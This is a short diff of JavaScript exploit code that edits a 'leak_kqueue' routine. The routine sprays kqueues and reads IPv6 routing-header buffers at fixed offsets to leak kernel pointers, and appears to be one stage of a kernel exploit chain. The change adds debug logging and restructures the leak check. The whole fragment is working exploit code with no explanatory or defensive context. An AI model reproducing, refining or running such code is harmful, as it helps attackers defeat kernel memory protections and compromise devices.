@@ -1471,16 +1471,24 @@ function leak_kqueue () {
   const magic_add = leak_rthdr.add(0x08)
 
   let count = 0
-  const MAX_KQ = 5000   // الحد الآمن الجديد
+  const MAX_KQ = 5000
 
   while (count < MAX_KQ) {
     count++
+
+    if (count % 500 === 0) {
+      debug('leak_kqueue iter=' + count)
+    }
 
     kq = kqueue()
 
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x100)
 
-    if (read64(magic_add).eq(magic_val) && !read64(leak_rthdr.add(0x98)).eq(0)) {
+    const magic_ok = read64(magic_add).eq(magic_val)
+    const fdp_ok = !read64(leak_rthdr.add(0x98)).eq(0)
+
+    if (magic_ok && fdp_ok) {
+      debug('leak_kqueue: magic + fdp OK at iter ' + count)
       break
     }
 
